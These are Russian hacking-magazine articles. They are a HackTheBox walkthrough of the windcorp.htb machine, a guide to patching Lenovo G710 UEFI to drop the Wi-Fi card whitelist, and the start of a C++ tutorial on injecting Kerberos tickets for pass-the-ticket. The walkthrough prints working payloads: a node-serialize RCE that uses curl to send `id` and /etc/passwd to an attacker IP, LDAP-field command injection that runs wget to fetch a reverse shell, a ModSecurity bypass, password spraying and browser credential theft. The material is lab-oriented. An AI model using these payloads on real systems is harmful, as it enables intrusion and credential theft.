как выявить и про эксплуатировать уязвимость при десери ализации данных
в Node.js. Я собрал и закодировал нагрузку, сле дуя рекомендаци ям из статьи,
но мой запрос был заб локирован.





               Сообщение о бло кировке зап роса

В тек сте страницы находим упоминание ModSecurity, который и блокирует
нам доступ.





                  Информация о защите сайта

Это очередное зве но цепочки, продолжаем раз бираться с сай том и вникнем
в Node.js более под робно.


ÒÎ×ÊÀ ÎÏÎÐÛ
Node.js RCE + áàéïàñ ModSecurity
ModSecurity — это WAF с откры тым исходным кодом. Именно ModSecurity
не дает нам подобраться к приложению. Но иног да и в самих WAF находят
уязвимос ти. Так, быстрый поиск в Google вывел меня на статью, где расска-
зано о CVE-2019-19886, позволяющей обойти ModSecurity. Удалось даже
най ти целый PoC для этой уяз вимости. Ее смысл заключается в том, что мы
используем ошибку в парсере ModSecurity и как бы прячем нагрузку, переда-
вая cookie param=payload следующим образом:


param=payload=real_value

Тогда приложе ние распарсит куки как param:payload, а WAF — как param:
payload=value, что позволит миновать фильтры.
  Для эксплуатации RCE в Node.js нам нуж но передать нагрузку через
параметр username в следующей конструкции:


{"username":"_$$ND_FUNC$$_function(){}()"}

Затем закодируем ее в Base64 и вставим в cookie как profile=payload=val-
ue.
  Первым делом откроем листенер nc -nlvp 80 и попробу ем выполнить
запрос на свой сервер через curl:


{"username":"_$$ND_FUNC$$_function(){require("child_process").exec("
curl http://10.10.14.29", function(error, stdout, stderr){});}()"}'



                   Исходное зна чение cookie





                    Ито говый зап рос на сервер





                       Логи листенера

В ито ге на наш листенер пришел запрос, а это зна чит, что мы добились RCE.
Выпол нить реверс-шелл не получилось, поэтому попробу ем записать ключ
SSH. Нам нужно знать имя пользователя, которого мы используем для выпол-
нения команд. Его мож но эксфиль тровать, закодировав в Base64 результат
выполнения команды id и вставив его как URI.


{"username":"_$$ND_FUNC$$_function(){ require("child_process").exec("
curl http://10.10.14.29/$(id|base64 -w0)", function(error, stdout,
stderr){});}()"}





                       Логи листенера



                       Логи листенера

Так мы получаем имя текуще го пользователя. Теперь узнаем, имеет ли он
доступ к командной оболочке, для чего получим запись из файла /etc/pass-
wd.


{"username":"_$$ND_FUNC$$_function(){ require("child_process").exec("
curl http://10.10.14.29/$(cat /etc/passwd| grep webster|base64 -w0)
", function(error, stdout, stderr){});}()"}



                       Логи листенера

Поль зователь имеет коман дную оболочку, теперь можем записы вать ключ
SSH. Для это го сгенерируем пару ключей с помощью ssh-keygen и запустим
в каталоге с клю чами веб-сервер Python 3:


python3 -m http.server 80

Затем скачаем ключ и запишем в файл authorized_keys.


{"username":"_$$ND_FUNC$$_function(){require("child_process").exec("
curl http://10.10.14.29/id_rsa.pub > ~/.ssh/authorized_keys",
function(error, stdout, stderr){});}()"}

Как толь ко в логах веб-сервера увидим обра щение к пуб личному ключу, мож-
но авто ризо ваться по SSH.




                  Сессия пользователя webserver


ÏÐÎÄÂÈÆÅÍÈÅ WEBSERVER.WINDCORP.HTB
В домаш нем катало ге пользователя находим бэкап, который скачиваем
на локальную машину.


scp -i id_rsa webster@10.10.11.179:~/backup.zip ./





                 Содержимое архива backup.zip

Видим несколь ко интересных файлов, но архив защищен паролем, при этом
прос мотр спис ка файлов разрешен. Схе ма с получением хеша и его даль-
нейшим перебо ром у таких архи вов не сра ботает, но можно провести атаку
на основе известно го откры того текста.


Zip decrypt
Для такой ата ки нужен известный нам файл, который также есть в архиве. Я
выбрал файл /etc/passwd. Его нуж но заархивировать — тоже с паролем (я
выбрал passwd) — и скачать на локальную машину. Когда все будет готово,
мы можем воспользоваться утилитой bkcrack. Пер вом делом получим ключ,
для чего укажем целевой архив (параметр -C), извес тный файл (параметр -с),
наш архив (параметр -P) и пароль от него (параметр -p).


./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd





                 Получение ключа шиф рования

А теперь уста навливаем на архив новый пароль.


./bkcrack -C backup.zip -U new.zip new -k d6829d8d 8514ff97 afc3f825





                     Расшифровывание архива

Те перь открываем new.zip с паролем new и выбира ем интересные файлы,
нап ример файлы кеша Kerberos.





                  Со держимое архива new.zip

А теперь выбира ем из фай лов все строки и находим учетные данные в файле
cache_windcorp.htb.ldb.





                      Ло гин поль зователя





                   Хеш пароля пользователя

Те перь узнаем режим для перебо ра хеша. Это можно сде лать, поискав мар-
кер в справ ке hashcat.


hashcat --example | grep '\$6\$' -A2 -B2





                      По иск типа хеша

Таким образом, это хеш SHA-512, для которого нуж но ука зывать режим 1800
(параметр -m).


hashcat -a 0 -m 1800 ray.hash rockyou.txt





                    Результат перебора хеша

По лучаем пароль, с которым успешно авторизуемся на хос те по SSH.


                 Сессия пользователя ray.duncan



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                      ОБХОДИМ MODSECURITY
                   И АТАКУЕМ ACTIVE DIRECTORY





ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ WEBSERVER.WINDCORP.HTB
Те перь,  когда мы получи ли дос туп  к хос ту, нам необходимо собрать
информацию. Я для этого обычно использую скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, можно использовать Privilege Escalation Awe-
some Scripts SUITE (PEASS) — набор скрип тов, которые проверя ют систему
на авто мате.


Заг рузим и выполним скрипт для Linux и с его помощью найдем адрес
еще одной машины в сети, а также узнаем, что наш хост находится в домене.





                 Содержимое фай ла /etc/hosts





                    Ин формация Kerberos

Так как мы в домене, поп робуем получить и кешировать билет TGT для нашего
поль зовате ля с помощью коман ды kinit. А затем проверим, можно ли получить
при виле гированный  контекст  с  помощью  ksu  (аналог  обычного  su
для Kerberos).





                 Смена контекста пользователя

Этот пользователь может изменить контекст безопас ности и  получить
высокие при вилегии на хос те. Забираем первый поль зователь ский флаг.




                       Флаг пользователя


ÐÀÇÂÅÄÊÀ Â ÑÅÒÈ WINDCORP.HTB
Ранее мы нашли хост windcorp.htb. Нужно его прос каниро вать; скорее все-
го, это контрол лер домена. Я загрузил на хост ста тически собранный Nmap
и запустил сканирование портов.


nmap -p- 192.168.0.2





                  Результат ска ниро вания пор тов

Доступен Kerberos, но зап рещен RPC, поэто му для даль нейшей работы
получим билет уже известного нам пользователя ray.duncan. Чтобы мы мог ли
работать с кон троллером домена напрямую со своей машины, нужно про-
кинуть трафик через промежуточ ный хост. Для это го можно использовать
стандартный SSH. Копируем ключ SSH руту, а затем указываем при под клю-
чении параметр -D, который скажет соз дать SOCKS-туннель.


ssh -i id_rsa root@10.10.11.179 -D 1080

Затем в фай ле /etc/proxychains.conf соз дадим запись для созданного
туннеля.


socks5 127.0.0.1 1080

А теперь сде лаем TGS-билет Kerberos для нашего пользователя, чтобы прос-
мотреть дос тупные общие каталоги. Для этого будем использовать скрипт
getST из пакета скрип тов impacket.


proxychains -q impacket-getST -dc-ip 192.168.0.2 -spn cifs/hope.
windcorp.htb windcorp.htb/ray.duncan:pantera





                 По лучение TGS для службы CIFS

Экспортируем билет в локальное окружение и подклю чаемся к службе SMB.


export KRB5CCNAME=ray.duncan.ccache
proxychains -q impacket-smbclient ray.duncan@hope.windcorp.htb -k
-no-pass





                     Об щие ресурсы

Сре ди этих каталогов наиболее интересен поль зователь ский WC-Share.





                Содержимое каталога WC-Share

Файл в этом катало ге содержит маленький список пользовате лей и какие-то
числа.




               Со держимое файла debug-users.txt

Не получив ничего больше, я решил прой тись по LDAP, но перед этим нужно
про верить, дос тупна ли аутентификация через Kerberos. Эту работу я про-
водил с про межуточ ного хоста, так как Kerberos там уже настроен.


ldapsearch -x -LLL -b "" -s base supportedSASLMechanisms -H ldap:/
windcorp.htb | grep GSSAPI



                  Резуль тат выполнения запроса

Сре ди поддержи ваемых механизмов аутентификации есть GSSAPI. Про верим
это, узнав свой рабочий контекст при аутентификации Kerberos для LDAP.


ldapwhoami -Y GSSAPI -H ldap://windcorp.htb





                 Ре зультат выполнения ldapwhoami

Все под твердилось, и мы успешно авторизо вались как текущий пользователь.
Теперь собираем все, что нам даст LDAP, и сохраняем в файл.


ldapsearch -LLLY GSSAPI -b 'DC=windcorp,DC=htb' -H ldap://windcorp.
htb > scan.txt





                       Дамп базы LDAP

Прос матри вая информацию о текущем пользователе, я обратил внимание
на его номер телефо на, который был записан в файл debug-users.txt вмес-
те с име нем пользователя.





               Парамет ры поль зователя Ray.Duncan

Вернувшись к обще му каталогу, обратим внимание на то, что файл обновля-
ется каждые две минуты.





                 Содержимое общего каталога

Возможно, на хосте работает скрипт, который получает записи из LDAP
и записы вает в файл. Попробуем выполнить инъекцию команды ОС.


HOPE.WINDCORP.HTB
Выпол ним зап рос на свой хост и проверим пред положе ние о внедрении
коман ды. Сперва создадим файл с правилом замены. Укажем в нем иден-
тификатор, дей ствие, поле и новое зна чение.


dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: ;wget http://10.10.14.173/file -O c:\wc-share\file;

Те перь изме ним номер в базе LDAP, ука зав файл с созданным правилом.


ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,
OU=Development,DC=windcorp,DC=htb" -f new.rec




                  Изменение записи в базе LDAP

Спустя минуту в логах веб-сер вера Python 3 видим пришедший запрос, а в
общем каталоге на сервере появился наш файл.



                      Ло ги веб-сервера





                 Содержимое обще го ресурса

Выпол нить реверс-шелл на PowerShell не вый дет, так как размер поля огра-
ничен и шелл прос то не помес тится в него. Тогда я решил эксфильтровать
результат выполнения команды через файл. Изме ним нашу запись, что бы она
выполняла команду whoami и записывала результат в файл.


mobile: ;whoami > c:\wc-share\r.txt



               Ре зультат выполнения команды whoami

Таким образом команда выполнилась. Но скрип ты, которые я загрузил,
не работа ли. Тогда я решил взглянуть на полити ки AppLocker.


mobile: ;Get-AppLockerPolicy -Effective -Xml > c:\wc-share\r .txt





                Политики AppLocker для скриптов

По лити ки для скрип тов и исполняемых файлов оди наковы и разрешают
выполнение файлов из катало га C:\Windows\ и всех его вложенных катало-
гов, за исключени ем перечисленных. Изучив записи, можно заметить, что
в исклю чении не указан каталог C:\Windows\debug\wia\. Тогда я решил соб-
рать реверс-шелл самостоятельно. Для этого мож но использовать удобный
онлайновый  генератор  реверс-шеллов.  Ука зываем  парамет ры,  такие
как локальные хост и порт, а также язык (я выбрал C#) и целевую систему.





                        Online Reverse Shell Generator

Собираем файл и загружаем в ука занный каталог.


mobile: ;wget http://10.10.14.3/ca.exe -O c:\windows\d ebug\w ia\c a.exe
;

Пос ле того как на наш веб-сервер пришел зап рос, открываем листенер
и выполняем скачанный файл.


mobile: ;c:\windows\debug\wia\ca.exe;





                       Соз данная сессия

Сессия  появи лась,  сразу  проверяем  контекст  работы,  запросив всю
информацию о поль зователе.





               Ин формация о текущем пользователе


ÏÐÎÄÂÈÆÅÍÈÅ HOPE.WINDCORP.HTB
Зай мемся базовой разведкой, есть выбор: можно использовать скрипты
на PowerShell вроде PowerUp, знамени тый WinPEAS или более спе циализиро-
ванный Seatbelt. Я использовал Seatbelt, для чего уже собранную версию
из ре пози тория заг рузил на хост.
  Сперва запускаем скрипт с параметром -group=system, чтобы перебрать
системные настройки.





                        Ло ги Seatbelt

Как видишь, на хосте активирована аутентификация NTLM, поэто му мы можем
обратиться к собс твенному ресур су и получить NetNTLMv2-хеш пароля поль-
зователя, так как он по умолчанию попытается авторизо ваться. Возьмем
с GitHub ском пилированный исполняемый файл impacket smbserver и заг-
рузим на удаленный хост Linux. Затем раз вернем простой сер вер SMB.


./smbserver_linux_x86_64 -smb2support asd .

Когда все будет готово, оста нется только обратиться к обще му ресурсу.
В логах сервера увидим учетные дан ные, использован ные при под клю чении.


dir \\webserver.windcorp.htb\asd\





                   Логи SMB-сервера impacket

Пароли такого типа можно подоб рать очень быстро. Я для этого использую
hashcat.


hashcat -m 5600 ntlm.hash rockyou.txt





                    Результат перебора хеша

Так мы получаем пароль пользователя scriptrunner. Нужно обязательно про-
верить, не используют ли этот пароль другие учет ные записи и пользователи.
У нас уже есть база LDAP, отфиль тру ем имена поль зовате лей и направим
в отдель ный файл.


cat scan.txt | grep -i samaccountname | grep -v '\$' | cut -d ' ' -f
2 > users.txt

А теперь спре им пароль по всем пользователям из файла с помощью ker
brute.


./kerbrute_linux_amd64 passwordspray -d windcorp.htb ./users.txt
'!@p%i&J#iNNo1T2'





                     Результат спрея пароля

Мы нашли еще одно го пользователя. Давай получим шелл от его имени стан-
дартным способом через New-PSSessions. Будем запускать наш исполня-
емый файл, поэтому предваритель но не забыва ем запустить еще один лис-
тенер на том же порте.


$pass = ConvertTo-SecureString '!@p%i&J#iNNo1T2' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('Bob.
Wood', $pass)
$session = New-PSSession -Credential $creds
Invoke-Command -Session $session -scriptblock { c:\windows\debug\wia\
ca.exe }





                  Сессия пользователя Bob.Wood


ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ HOPE.WINDCORP.HTB
Мы заш ли от имени другого пользовате ля, но нет смысла снова проверять
все воз можности повышения при вилегий. Мож но проверить только парамет-
ры, специфичные для отдельного пользователя. В  Seatbelt используем
параметр -group=misc. В поле ChromeHistory будет история запросов поль-
зователя из браузера.





                 Ис тория запросов из браузера

Что бы «рас потрошить» любой бра узер на полез ные для атакующе го данные,
можно использовать написанную на Go утилиту HackBrowserData. Загружаем
исполняемый файл на удаленный хост и запус каем.





                     Логи HackBrowserData

HBD обнаружил и экспортировал все данные из браузе ра Edge. Первым
делом нас интересуют сохранен ные учетные дан ные.




                   Сох раненные учетные дан ные

Спи сок поль зовате лей у нас есть, теперь получаем еще и пароли. Спреим
полученные пароли по всем пользователям.


kerbrute_linux_amd64 passwordspray -d windcorp.htb ./users.txt
'smeT-Worg-wer-m024'





                     Результат спрея пароля

В ито ге получаем учетные данные еще одного пользовате ля (при этом с при-
пиской adm). Конечно, соз даем реверс-шелл в его кон тексте.


$pass = ConvertTo-SecureString 'smeT-Worg-wer-m024' -AsPlainText
-Force
$creds = New-Object System.Management.Automation.PSCredential('bob.
woodadm', $pass)
$session = New-PSSession -Credential $creds
Invoke-Command -Session $session -scriptblock { c:\windows\debug\wia\
ca.exe }





                  Информация о пользователе

Как можно заметить, пользователь входит в груп пу адми нистраторов домена.
Забираем флаг рута.


                           Флаг рута

Машина захвачена! © X
ТРЮКИ





     ВЗЛАМЫВАЕМ UEFI НОУТБУКА
       LENOVO, ЧТОБЫ ПОМЕНЯТЬ
            АДАПТЕР WI-FI





Есть катего рия людей, которые считают, что
из тех ники нуж но выжимать все 100% ее
потенциала, то есть она должна работать
до тех пор, пока окон чательно не истлеет.
Сегодняшняя статья — именно для них. Мы            Candidum                                                                                               duospirit@gmail.com
про апгрей дим  Wi-Fi  в  ноутбуке  Lenovo
G710 и отключим white list, даже не восполь-
зовав шись ассем бле ром.


Все началось с того, что я при обрел себе ноут Dell Vostro 5301. И вот в один
прекрасный день, гоняя по локалке очеред ной десяток гигабайт, я подумал,
что, имея роутер с Wi-Fi 5 и ноут с его поддержкой, глупо его не использовать
на всю катушку. Я вклю чил на роутере Wi-Fi 5, попробовал, и мне пон-
равилось.


ÒÐÅÍÈÐÓÅÌÑß ÍÀ ÊÎØÊÀÕ

Но возникла одна проблема: остальные ноуты в моей сети не уме ли Wi-Fi 5,
поэтому, посидев и подумав, я решил, что приш ла пора апгрейда. Обновить
предсто яло два аппарата: огры зок ASUS X553MA, который трудится у меня
файлопомойкой, и Lenovo G710, которым поль зуется жена. Это как раз тот
слу чай, когда из короб ки нет драйверов, их пришлось тянуть с AUR, благо
про вод ной адаптер на ноутбуке завелся.
  Памятуя о проблемах с род ной вай файкой Lenovo G710, я решил выб рать
заведо мо беспроб лемный адаптер Intel Wireless 7260, для которого в ядре
Linux есть драй веры. Также я заранее учел, что в Lenovo G710 и ASUS X553MA
раз ные разъемы PCI Express для под ключения адап теров и что со сме ной
адаптера в ASUS придется поменять еще и антенну. Сме на антенны необ-
ходима из-за разных разъемов на род ном и новом адаптерах. Кро ме того,
в X553MA установлена лишь одна антенна main (экономия, однако), а новый
адаптер предусматри вает подклю чение двух антенн, основной и вспомога-
тель ной. Благо сто ят они недорого и устанавливаются элемен тарно. Вот так
это добро выглядит.





                    Адап тер Wi-Fi для Lenovo G710





                   Адап тер Wi-Fi для ASUS X553MA





                Новая антенна для ASUS X553MA

Пришло время все это дело установить и подклю чить. Пер вым на очереди
был ASUS X553MA, и с ним, к моему удивлению, все прошло гладко: адаптер
встал, заработал, и система его сразу же подхватила, пришлось только имя
адаптера в юни те wpa_supplicant и dhcpcd поменять.


ÂÀÉÒËÈÑÒ È ÂÅÍÄÎÐËÎÊ

А вот с Lenovo G710 получилось гораз до веселее: там в биосе есть вен-
дорлок. При началь ной заг рузке UEFI определя ет установленный адап тер
и ищет его в white list’е, зашитом про изводителем. Стоит ли говорить, что Intel
Wireless 7260 там не оказалось и ноутбук встретил меня радостным сооб-
щени ем.





                                        Error

В принципе, я к этому был готов еще на этапе пла ниро вания апгрей да,
но успех с ASUS все лил в меня надежду, что замена адаптера может про-
катить. Не про кати ло…
  Поиск в гугле показал, что проб лема в целом известная и лечится переп-
рошивкой биоса про патченной версией, которую можно поискать в интерне-
те. К несчастью, биоса для моей модели не нашлось, остался последний
вари ант: ковырять UEFI самостоятельно.
  В сети в целом есть ряд неп лохих ману алов на тему обхо да white list’а, нап-
ример на Хабре (изображение экра на я взял оттуда, поскольку мое не сох-
ранилось), и там нет ничего зап редель но слож ного. Надо рас паковать UEFI,
най ти там участок с текстом ошиб ки, посмотреть, какая функция на него ссы-
лает ся, и заменить один из условных переходов дру гим условным перехо-
дом — или безусловным переходом, тут есть некото рая вари атив ность. Сму-
щали меня во всем этом две вещи: во-первых, большинство мануалов
заточены под виндовый софт, во-вто рых, с ассем блером я, мягко говоря,
на вы.
  Нес колько углубив шись в тему, я узнал про замеча тельную программу UE-
FITool и нашел пару при меров по работе с ней: часть 1 и часть 2. Это приб-
лизило меня к решению проблемы, одна ко рекомен дации во всех приведен-
ных выше источниках носили скорее общий характер. И вот тут я наткнулся
на отличную статью авто ра под ником p0358, описывающую в подробнос тях,
как он ковырял UEFI своего Lenovo G510, решая ту же проблему, что и я.
  После ее прочтения становит ся понятно, как найти завет ное место,
в котором нужно исправить jz на jmp, что бы обойти white list. От себя могу
добавить, что при седания авто ра с использовани ем двух версий UEFITool
излишни, впол не можно обойтись и актуальной версией. Кроме того, в нас-
тоящее вре мя бес плат ная версия декомпилятора IDA Free уме ет работать
с UEFI-бинарниками, так что без IDA Pro тоже мож но обойтись. Но главная
фича этой статьи зак лючается в том, что автор обна ружил в коде UEFI Lenovo
G510 переменные, которые отключают white list вовсе, и это очень упрощает
все мероприятие.





                  Те самые переменные в бинарнике

Ко неч но, Lenovo G510 — это не G710, одна ко они ровесники и, счи тай,
из одной линей ки, поэтому я понадеялся, что их прошивки не дол жны заметно
отли чаться и пропатчить биос удастся малой кровью. Забегая впе ред, скажу,
что так все и получилось.




                  Мо дифи кация  UEFI  ноутбука,  как,  впрочем,
                      и ковыряние в его потрохах шаловливыми ручон-
                        ками, лег ко могут окир пичить устрой ство. А при
                        удачном стечении обстоятельств — физически
                      вывести его из строя. Поэтому все ниже опи сан-
                     ные манипуляции ты про изводишь на свой страх
                      и риск. Правовой статус данных манипуляций
                      тоже сом нительный.



ÎÒ ÒÅÎÐÈÈ Ê ÏÐÀÊÒÈÊÅ

Итак, что бы модифи цировать прошив ку, ее нужно сначала извлечь с флешки
UEFI. Это мож но сделать сугубо прог раммными методами, хотя у меня с нас-
кока этот финт не вышел. Тем не менее в любом случае надо держать
под рукой программатор, так как веро ятность накосячить здесь ненуле вая,
а ожи вить окирпиченный ноут без программа тора уже не выйдет. Я исполь-
зовал программатор на CH341: дешево и сер дито, кроме того, он совместим
с удобной ути литой ashrom.





                      Программатор на CH341

На пред став ленном изоб ражении лег ко заметить прищепку для малоинвазив-
ного под клю чения к микросхеме ash-памяти и переходник для подключения
при щепки. Разумеется, надежнее и в некотором смысле правильнее отпаять
мик росхе му, прошить и запаять обратно, одна ко я человек ленивый и пред-
почитаю сначала испробовать вариант попроще. Примене ние прищепки
именно такой вариант: она, конечно, нес колько капризна и не всегда дает
надеж ный контакт, но раза со второго-третьего все обыч но получается.




                    Ис пользуя при щепку, очень внимательно сле ди
                        за  правильностью  под ключения  микросхемы
                          к программатору (особенно вывод Vcc), ошиб ка
                     может привес ти к перепо люсовке питания с весь-
                    ма печаль ными последс твиями. Так что тут лучше
                      трижды все проверить перед включением прог-
                    рамматора. Сожженная до снятия дампа мик-
                       росхема ash — это epic fail.


С программатором разоб рались, теперь надо доб раться до самой флешки.
У Lenovo G710 это не очень приятный процесс: потребуется почти пол ная раз-
борка аппарата. Самое смеш ное, что у это го ноута снизу удобно снимаемая
крыш ка, ее  удаление позволяет  легко почистить сис тему охлаждения,
заменить память, хард и даже проц при желании (да, он там не распаянный),
а вот флешка UEFI расположена с дру гой стороны платы, под клавиатурой.
Поэтому верхнюю панель и клавиатуру при дется снять. Рас положение флеш-
ки UEFI показа но на фотографии.





               Рас положение флешки UEFI Lenovo G710

Те перь можно подключить к ней при щепку и все еще раз проверить.





              Прищепка, подключенная к флешке UEFI

Ес ли все сделано правильно, вклю чаем прог рамматор и снимаем дамп
с флеш ки. Программа тор, конечно, верифи циру ет считанный дамп, но я
для пол ного душев ного спокойствия счи тал его дваж ды и сравнил результаты
с помощью diff. Про писы вать тип флешки нет осо бой нужды: ashrom и сам
ее прекрасно определяет.


sudo flashrom --programmer ch341a_spi -r down_g710-1.bin
sudo flashrom --programmer ch341a_spi -r down_g710-2.bin
diff down_g710-1.bin down_g710-2.bin

Ес ли вдруг со считыванием возникли проблемы, надо пошеве лить прищепку:
скорее все го, виноват плохой контакт.
   Итак, дамп у нас есть, теперь запускаем UEFITool и открываем дамп в этом
при ложе нии.


uefitool down_g710-1.bin





                Окно UEFITool с открытым дам пом

Вызываем окно поиска и ищем нашу любимую стро ку Unauthorized Wireless
network card is plugged in.





                         Окно поиска

Видим, что строка наш лась, жмем на результат, откры вается нужная нам сек-
ция.





                        Результат поиска





                       Нужная нам секция

Для найден ной сек ции в контекс тном меню выбира ем «Extract body…» и сох-
раняем файл.
   Те перь нам понадобится hex-редактор. Я, не мудрствуя лукаво, восполь-
зовался встроенным в mc. Откры ваем для просмотра сохраненный файл
и переключаемся в режим HEX. Можно воспользоваться поис ком, однако
это не обязательно: файл небольшой, нужный участок располагается в самом
его кон це и лег ко находит ся «глазами».





                   Ис комый фраг мент файла

Пе реключаемся в режим редактора, изме няем значения указанных бай тов
с 01 на 00 и сох раня ем результат.



                  Отредактированный фраг мент

Те перь воз вращаемся в UEFITool и с помощью контекстного меню заменя ем
экстрагиро ван ную ранее секцию (пункт в меню «Replace body...») отре дак-
тированной нами.





                    Замена сек ции в UEFITool

Старая сек ция помеча ется на удаление, новая на замену, а весь фрагмент —
на пересборку. Чтобы изменения всту пили в силу, оста лось сохранить про-
пат ченный дамп. Все, дело сделано, нуж но только залить обновленный образ
обратно на флешку. Для этого снова подклю чаем программатор и вызываем
ashrom.


sudo flashrom --programmer ch341a_spi -w down_g710_no_white_list.bin

Те перь ноут можно собирать и включать, новая карта Wi-Fi определилась
и завелась сра зу. Самое смешное, что мне не пот ребовалось даже менять
имя карты в юните wpa_supplicant: к моему удив лению, оно осталось преж-
ним. Так что даже сеть поднялась с ходу. Приятным бонусом к апгрейду стало
сокращение времени, требующегося на пер вичную инициализацию ноутбука,
что дало уско рение заг рузки на три-четыре секун ды. На этом аппарате
это почти двукратное увеличе ние скорости, он теперь включает ся быстрее
чем за пять секунд — недурно для девятилетнего ноута.
   Да, там сто ит SSD и исполь зуется EFISTUB. Есть все основания полагать,
что ноут пос лужит верой и правдой еще нес колько лет. © X
КОДИНГ





         ИНЖЕКТИМ ТИКЕТЫ
         СВОИМИ РУКАМИ





Для реали зации целого ряда атак типа pass
the ticket необходимо внедрить в скомпро-
метированную  систему  билет  Kerberos.
Обыч но для это го используются инс тру-
мен ты вро де Mimikatz, Impacket или Rubeus,         MichelleVermishelle                                                                                   18 y.o. | TG: @MichaelZhm
но они отлично палят ся антивирусами, что        michael.zhmailo@yandex.ru
дела ет  такой  подход  неэф фектив ным.
В  этой  статье  я  подробно  рассмотрю
методы решения этой задачи без вспо-
мога тель ных  инструментов,  с  исполь-
зованием только WinAPI и магии.


В пре дыдущей моей статье я расска зал об Authentication Package, Security
Package и мы успешно перехватили пароль поль зователя. Но этого мало,
не так ли? Сле дующим шагом будет внедрение билетов Kerberos для реали-
зации атаки pass the ticket. Само собой, никакого Mimikatz и Impacket мы
использовать не будем. Абсолютно все будет сделано своими силами (ну и с
использованием стан дартного Win32 API).


ÏÎËÓ×ÅÍÈÅ ÒÈÊÅÒÀ

Тикет передается атакующему, например при дампе, в формате Base64 —
в «сыром» виде тикет может иметь непечатаемые символы, что при ведет
к выводу на экран непонятно чего. В связи с этим, чтобы наш код мог
инжектить рабочие  тикеты, следует предус мотреть в нем воз можность
декоди ровать  полученную  строку.  Предлагаю  создать  файл  stuff.h,
в котором реализуем прос тенькую функцию для декоди рования значения
Base64. Допол нительно помес тим туда все заголо вочные файлы, которые
пот ребуются нам в будущем.


#pragma once
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#include <string>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#pragma comment (lib, "Secur32.lib")
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G',
'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O',
'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W',
'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e',
'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm',
'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u',
'v',
                                'w', 'x', 'y', 'z', '0', '1', '2',
'3',
                                '4', '5', '6', '7', '8', '9', '+', '/
' };
static char* decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };


void build_decoding_table();
unsigned char* base64_decode(const char* data, size_t input_length,
size_t* output_length);
void build_decoding_table() {


    decoding_table = (char*)malloc(256);
    if (decoding_table == NULL) {
        exit(-1);
    }
    for (int i = 0; i < 64; i++) {
        decoding_table[(unsigned char)encoding_table[i]] = i;
    }
}


unsigned char* base64_decode(const char* data, size_t input_length,
size_t* output_length) {


    if (decoding_table == NULL) build_decoding_table();


    if (input_length % 4 != 0) return NULL;


    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (data[input_length - 2] == '=') (*output_length)--;


    unsigned char* decoded_data = (unsigned char*)malloc(*
output_length);
    if (decoded_data == NULL) return NULL;


    for (int i = 0, j = 0; i < input_length;) {


        DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[
data[i++]];
        DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[
data[i++]];
        DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[
data[i++]];
        DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[
data[i++]];


        DWORD triple = (sextet_a << 3 * 6)
            + (sextet_b << 2 * 6)
            + (sextet_c << 1 * 6)
            + (sextet_d << 0 * 6);


        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8)
& 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8)
& 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8)
& 0xFF;
    }


    return decoded_data;
}

Тикет нашей прог рамме мы будем передавать через аргументы командной
строки. Создадим файл Source.cpp с таким содержимым:


#include "stuff.h"


void usage() {
    std::cout << "ptt.exe <b64 ticket>" << std::endl;
}


int main(int argc, char** argv) {
    if (argc != 2) {
        usage();
        return 1;
    }


    unsigned int kirbiSize = 0;
    char* ticket = argv[1];
    unsigned char* kirbiTicket = base64_decode(ticket, strlen(ticket)
, &kirbiSize);
    if (kirbiSize == 0) {
        std::wcout << L"[-] Error converting from b64" << std::endl;
        return 1;
    }


    ...

В этом файле мы получаем второй аргу мент, содер жащий закодированный
в Base64 тикет. Пер вый — это имя прог раммы: например, в слу чае вызова
prog.exe 123 в argv[0] будет prog.exe, а в argv[1] — 123. Пос ле чего
вызываем функцию для декоди рования, про веряем, что размер изменился.
Ведь если изменился раз мер, значит, что-то (может, даже и успешно)
декоди ровалось.


ÏÎÄÊËÞ×ÅÍÈÅ Ê LSA

Именно про цесс службы LSA будет хранить в своем адресном пространстве
все тикеты. Внутри процес са lsass.exe подгружена kerberos.dll, которая
и реализует все функции одноимен ного протокола. Так или иначе, следует
отли чать TGT от TGS, да и в прин ципе понимать работу «Кер бероса». Вот
видеоролики, которые поз волят новичкам разоб раться в теме:
 • Керберос.  Использование  аутентифика ционных  протоко лов  Windows
   в тес тировании на про никновение;
 • Школа информационной безопасности Яндекса. Windows & AD.

Под клю чить ся к LSA несложно, для это го есть две спе циальные функции.


NTSTATUS LsaRegisterLogonProcess(
  [in]  PLSA_STRING           LogonProcessName,
  [out] PHANDLE               LsaHandle,
  [out] PLSA_OPERATIONAL_MODE SecurityMode
);


NTSTATUS LsaConnectUntrusted(
  [out] PHANDLE LsaHandle
);

Первая позволяет получить хендл на LSA от лица процесса входа в сис тему.
Эту функцию, например, вызывает winlogon.exe во вре мя вхо да пользовате-
ля в сис тему. С помощью полученного таким образом хендла появится воз-
можность использовать LSA для аутентифика ции, управле ния пользователь-
ским входом и доступом.
